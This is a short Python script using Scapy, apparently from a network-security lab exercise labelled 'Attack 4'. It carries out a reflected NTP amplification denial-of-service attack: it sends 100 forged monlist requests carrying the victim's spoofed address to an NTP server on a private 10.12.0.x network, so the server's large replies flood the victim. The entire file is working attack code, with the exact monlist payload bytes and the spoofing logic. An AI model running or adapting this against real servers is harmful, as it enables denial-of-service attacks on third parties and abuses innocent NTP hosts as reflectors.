#!/usr/bin/env python3
# Attack 4: Reflected NTP Amplification DDoS
# Run from: internet
# Spoofs victim's IP, sends NTP monlist requests to NTP server
# NTP server floods victim with large replies
# Usage: python3 ntp_amplification.py

from scapy.all import *

# NTP server in our topology
NTP_SERVER = "10.12.0.30"
NTP_PORT = 123

# Victim - http server
VICTIM_IP = "10.12.0.10"

COUNT = 100

def ntp_amplification():
    print(f"[*] Starting NTP Amplification Attack")
    print(f"[*] NTP Server: {NTP_SERVER}")
    print(f"[*] Victim: {VICTIM_IP}")
    print(f"[*] Sending {COUNT} spoofed NTP monlist requests...")

    for i in range(COUNT):
        # Spoof source IP as victim
        # NTP server will send large reply to victim
        pkt = (
            IP(src=VICTIM_IP, dst=NTP_SERVER) /
            UDP(sport=RandShort(), dport=NTP_PORT) /
            Raw(load="\x17\x00\x03\x2a" + "\x00" * 4)
            # monlist request - triggers large response
        )
        send(pkt, verbose=0)
        if i % 10 == 0:
            print(f"  [+] Sent {i}/{COUNT} spoofed NTP requests")

    print(f"[+] Attack complete!")
    print(f"[+] NTP server sent large replies to victim {VICTIM_IP}")

if __name__ == "__main__":
    ntp_amplification()
